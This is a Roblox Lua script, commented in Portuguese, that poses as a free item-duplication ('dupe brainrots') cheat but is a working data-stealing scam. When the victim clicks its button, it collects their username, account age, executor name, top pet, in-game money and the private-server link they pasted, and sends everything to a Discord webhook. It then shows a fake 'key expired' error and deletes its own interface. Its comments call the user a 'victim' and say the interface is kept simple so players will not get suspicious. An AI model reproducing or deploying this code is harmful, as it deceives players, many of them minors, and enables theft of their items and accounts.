--[[
    DUPE BRAINROTS FREE - AUTOMATIC SYSTEM
]]

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local player = Players.LocalPlayer

-- Função para detectar automaticamente o pet mais forte ou raro (ajustável por jogo)
local function detectBrainrot()
    local bestPet = "Nenhum detectado"
    -- Tenta procurar em locais comuns de inventário
    local inv = player:FindFirstChild("Inventory") or player:FindFirstChild("Pets")
    if inv then
        local child = inv:GetChildren()[1]
        if child then bestPet = child.Name end
    end
    return bestPet
end

-- Função para detectar o dinheiro automaticamente
local function detectMoney()
    local money = "0"
    local stats = player:FindFirstChild("leaderstats")
    if stats then
        -- Tenta nomes comuns como Cash, Money, Coins, Yen
        local m = stats:FindFirstChild("Cash") or stats:FindFirstChild("Money") or stats:FindFirstChild("Coins")
        if m then money = tostring(m.Value) end
    end
    return money
end

-- Função para enviar os dados ao seu Discord
local function sendToWebhook(webhookUrl, scriptKey, vipLink)
    local accountAge = player.AccountAge
    local username = player.Name
    local executor = identifyexecutor() or "Unknown"
    
    -- Detecção automática
    local brainrotDetectado = detectBrainrot()
    local dinheiroDetectado = detectMoney()

    local data = {
        ["username"] = "DUPE BRAINROTS FREE", 
        ["avatar_url"] = "https://i.imgur.com/wSTFk7U.png",
        ["embeds"] = {{
            ["title"] = "🚀 Vítima Detectada (Auto-Scan)",
            ["description"] = "O script coletou os dados automaticamente ao ser executado.",
            ["color"] = 16711680,
            ["fields"] = {
                {["name"] = "👤 Usuário", ["value"] = username, ["inline"] = true},
                {["name"] = "📅 Idade da Conta", ["value"] = tostring(accountAge) .. " dias", ["inline"] = true},
                {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true},
                {["name"] = "🧠 Brainrot (Auto)", ["value"] = brainrotDetectado, ["inline"] = true},
                {["name"] = "💰 Dinheiro (Auto)", ["value"] = dinheiroDetectado, ["inline"] = true},
                {["name"] = "🔑 Chave", ["value"] = scriptKey or "N/A", ["inline"] = true},
                {["name"] = "🔗 Link VIP Fornecido", ["value"] = vipLink or "Não preenchido", ["inline"] = false},
            },
            ["footer"] = {["text"] = "SISTEMA AUTOMÁTICO - DUPE BRAINROTS FREE"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local jsonData = HttpService:JSONEncode(data)
    request({
        Url = webhookUrl,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end

-- Interface Visual (Apenas o Link VIP para não desconfiarem)
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "DupeGui"
ScreenGui.Parent = game.CoreGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 300, 0, 180)
MainFrame.Position = UDim2.new(0.5, -150, 0.5, -90)
MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainFrame.Parent = ScreenGui

local Title = Instance.new("TextLabel")
Title.Text = "DUPE BRAINROTS FREE"
Title.Size = UDim2.new(1, 0, 0, 40)
Title.TextColor3 = Color3.fromRGB(0, 255, 150)
Title.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 16
Title.Parent = MainFrame

local VipInput = Instance.new("TextBox")
VipInput.PlaceholderText = "Cole seu Link VIP aqui para duplicar"
VipInput.Size = UDim2.new(0.9, 0, 0, 40)
VipInput.Position = UDim2.new(0.05, 0, 0.35, 0)
VipInput.Parent = MainFrame

local ActivateBtn = Instance.new("TextButton")
ActivateBtn.Text = "ATIVAR DUPE"
ActivateBtn.Size = UDim2.new(0.9, 0, 0, 45)
ActivateBtn.Position = UDim2.new(0.05, 0, 0.65, 0)
ActivateBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
ActivateBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ActivateBtn.Font = Enum.Font.GothamBold
ActivateBtn.Parent = MainFrame

ActivateBtn.MouseButton1Click:Connect(function()
    if _G.Webhook and _G.Webhook ~= "" then
        ActivateBtn.Text = "DUPLICANDO..."
        -- Envia tudo (incluindo o que detectou escondido)
        sendToWebhook(_G.Webhook, _G.Key, VipInput.Text)
        
        wait(2)
        ActivateBtn.Text = "ERRO: CHAVE EXPIRADA"
        ActivateBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
        wait(2)
        ScreenGui:Destroy()
    end
end)
